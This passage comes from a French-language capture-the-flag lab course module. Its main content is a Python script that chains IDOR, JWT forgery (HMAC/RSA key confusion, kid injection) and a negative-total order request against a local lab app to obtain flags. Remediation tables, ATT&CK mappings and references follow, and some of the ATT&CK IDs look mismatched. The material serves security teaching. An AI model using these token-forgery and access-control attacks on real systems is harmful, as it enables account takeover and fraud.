    │   └── POST /api/order → flag{business_logic_overflow_2026}
    │
    └── Objectif atteint : 2 flags récupérés
```

**Script de synthèse :**

```python
#!/usr/bin/env python3
"""
tp_synthese.py — Parcours complet du Module 3
Enchaîne les 3 vulnérabilités : IDOR → JWT Forge → Business Logic Overflow
Parcours d'attaque complet d'un utilisateur standard à l'obtention des flags.
"""
import jwt
import requests

# URL de base du laboratoire
BASE = "http://localhost:8080"

# Session HTTP persistante — conserve le JWT entre les requêtes
s = requests.Session()

print("=" * 60)
print("Étape 1 — Connexion")
print("=" * 60)
# Connexion initiale avec le compte user standard fourni par le lab
s.post(f"{BASE}/login", data={"email": "user@ecovault.com", "password": "User2026!"})
print("[+] Connecté en tant que user@ecovault.com\n")

print("=" * 60)
print("Étape 2 — IDOR : Récupération du profil admin")
print("=" * 60)
# Attaque IDOR : on accède au profil admin (ID=1) depuis la session user (ID=2)
# Le endpoint ne vérifie PAS l'appartenance du profil demandé
r = s.get(f"{BASE}/api/profile/1")
admin_data = r.json()
print(f"    Email  : {admin_data.get('email')}")
print(f"    Rôle   : {admin_data.get('role')}")
print(f"    API Key: {admin_data.get('api_key')}")
print()

print("=" * 60)
print("Étape 3 — JWT Forge (HMAC/RSA Confusion)")
print("=" * 60)
# Récupération de la clé publique RSA depuis l'API
pub = s.get(f"{BASE}/api/jwt-info").json()["public_key"]
# Payload admin pour le token forgé
admin_payload = {"user_id": 1, "email": "admin@ecovault.com", "role": "admin"}
# Forge du token JWT : signature HS256 avec la clé publique (HMAC/RSA confusion)
forged_token = jwt.encode(admin_payload, pub, algorithm="HS256")
print(f"    Token forgé: {forged_token[:50]}...")
# Test du token forgé contre le endpoint admin/debug
r = s.get(f"{BASE}/admin/debug", cookies={"token": forged_token})
if r.ok:
    print(f"    [+] Accès admin confirmé")
    print(f"    [+] Debug info: {r.json()}")
else:
    # Fallback : Kid Injection si HMAC/RSA confusion échoue
    print(f"    [-] Échec, tentative avec kid injection...")
    forged_token = jwt.encode(admin_payload, "", algorithm="HS256",
                              headers={"kid": "/dev/null"})
    r = s.get(f"{BASE}/admin/debug", cookies={"token": forged_token})
    print(f"    [+] Token forgé (kid): {forged_token[:50]}...")
    print(f"    [+] Debug info: {r.json()}")
print()

print("=" * 60)
print("Étape 4 — Business Logic Overflow")
print("=" * 60)
# Exploitation de l'integer overflow : price=0 + total négatif
r = s.post(f"{BASE}/api/order", json={
    "product_id": 1, "quantity": 1, "price": 0, "total": -999999
})
result = r.json()
print(f"    Message: {result.get('message')}")
print(f"    Credit : {result.get('credit')}€")
print()

print("=" * 60)
print("RÉSULTATS")
print("=" * 60)
# Affichage des deux flags obtenus
print(f"  Flag 1 (IDOR)    : {admin_data.get('api_key')}")
print(f"  Flag 2 (Overflow) : {result.get('message')}")
```

**Explication du script Python :**
| Élément | Rôle/Explication |
|------|------|
| `import jwt` | Bibliothèque PyJWT pour encoder/décoder les JWT. Utilisée pour forger un token admin via HMAC/RSA confusion ou kid injection. |
| `import requests` | Bibliothèque HTTP. Utilisée pour toutes les interactions avec l'API du laboratoire. |
| `requests.Session()` | Session persistante : conserve le JWT automatiquement entre les requêtes via le mécanisme de cookies. |
| `s.get(f"{BASE}/api/profile/1")` | **IDOR** : récupère le profil admin (ID=1) sans autorisation. |
| `s.get(f"{BASE}/api/jwt-info")` | **JWT** : récupère la clé publique RSA pour forger un token admin. |
| `jwt.encode(admin_payload, pub, algorithm="HS256")` | **HMAC/RSA Confusion** : signe le payload admin avec HS256 en utilisant la clé publique comme secret. |
| `jwt.encode(admin_payload, "", algorithm="HS256", headers={"kid": "/dev/null"})` | **Kid Injection** (fallback) : signe avec une clé vide via path traversal vers /dev/null. |
| `s.post(f"{BASE}/api/order", json={"price": 0, "total": -999999})` | **Business Logic Overflow** : envoie price=0 et total négatif pour obtenir le flag. |
| `r.ok` | Propriété de `requests.Response` : `True` si le code HTTP est 200-399 (succès), `False` sinon. |
| `admin_data.get('api_key')` | Extrait la clé API admin = premier flag (IDOR). |
| `result.get('message')` | Extrait le message de la réponse = second flag (overflow). |

```bash
# Exécution du script de synthèse — parcours complet du Module 3
# Enchaîne : connexion → IDOR → JWT forge → Business Logic Overflow
# Affiche les deux flags obtenus
python3 tp_synthese.py
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `python3 tp_synthese.py` | Lance le script de synthèse qui exécute le parcours d'attaque complet du Module 3 : récupération du profil admin par IDOR, forge d'un token JWT admin, et exploitation de l'integer overflow. Affiche les deux flags. |


### 6.2 Tableau de synthèse des techniques ATT&CK

| Étape | Technique | ID ATT&CK | Point d'entrée | Impact |
|-------|-----------|-----------|----------------|--------|
| 1 | Insecure Direct Object Reference | T1548.002 | `GET /api/profile/{id}` | Accès non autorisé aux profils utilisateurs |
| 2a | Token Manipulation — JWT None Alg | T1134.003 | En-tête JWT `alg: none` | Contournement complet de l'authentification |
| 2b | Token Manipulation — HMAC/RSA Confusion | T1134.003 | Clé publique exposée sur `/api/jwt-info` | Forge de token admin |
| 2c | Token Manipulation — Kid Injection | T1134.003 | Paramètre `kid` dans l'en-tête JWT | Signature avec clé arbitraire |
| 3 | Race Condition — TOCTOU | T1068 | `POST /api/transfer` avec `time.sleep(1)` | Utilisation multiple d'un coupon |
| 4 | Business Logic — Integer Overflow | T1068 | `POST /api/order` avec `total` négatif | Crédit frauduleux et obtention du flag |
| 5 | Valid Accounts — Default Credentials | T1078.001 | Compte `user@ecovault.com` divulgué | Accès initial au système |

### 6.3 Heat map ATT&CK (Module 3)

```
Techniques exploitées dans ce module :

T1548 ─ Abuse Elevation Control Mechanism
├── T1548.002 ─ IDOR ──── ████████████ 100%

T1134 ─ Access Token Manipulation
├── T1134.003 ─ JWT None ── ████████████ 100%
├── T1134.003 ─ JWT Confusion ████████████ 100%
└── T1134.003 ─ Kid Inject ─ ████████████ 100%

T1078 ─ Valid Accounts
├── T1078.001 ─ Credentials ████████░░░ 80%

T1068 ─ Exploitation for Privilege Escalation
├── Race Condition ─────── ████████████ 100%
└── Business Logic ─────── ████████████ 100%
```

### 6.4 Recommendations de remédiation

| Vulnérabilité | Correctif | Priorité NIS2 |
|---------------|-----------|---------------|
| IDOR | Vérifier l'appartenance de chaque ressource : `if user_id != current_user.id: return 403` | Critique |
| JWT None Alg | Refuser `alg: none` dans la bibliothèque JWT | Critique |
| JWT Confusion | Utiliser des clés différentes pour HMAC et RSA, vérifier l'algo attendu | Élevée |
| Kid Injection | Valider le `kid` contre une liste blanche, ne pas faire de path traversal | Élevée |
| Race Condition | Rendre les opérations atomiques (transactions SQL, verrous applicatifs) | Élevée |
| Price Manipulation | Recalculer le prix côté serveur à partir de la base de données | Moyenne |
| Integer Overflow | Valider les types et les bornes : `if quantity <= 0: raise` | Moyenne |

### 6.5 Pour aller plus loin

**Ressources :**

| Ressource | URL |
|-----------|-----|
| MITRE ATT&CK — T1548 | https://attack.mitre.org/techniques/T1548/ |
| MITRE ATT&CK — T1134 | https://attack.mitre.org/techniques/T1134/ |
| MITRE ATT&CK — T1068 | https://attack.mitre.org/techniques/T1068/ |
| PortSwigger — IDOR | https://portswigger.net/web-security/access-control/idor |
| PortSwigger — JWT | https://portswigger.net/web-security/jwt |
| PortSwigger — Race Conditions | https://portswigger.net/web-security/race-conditions |
| OWASP — Business Logic | https://owasp.org/www-community/vulnerabilities/Business_Logic_Vulnerability |
| jwt_tool | https://github.com/ticarpi/jwt_tool |
| JWT.io | https://jwt.io |
| Turbol Intruder (Burp) | https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988 |

---

*Fin du Module 3 — Authentification & Logique Métier*
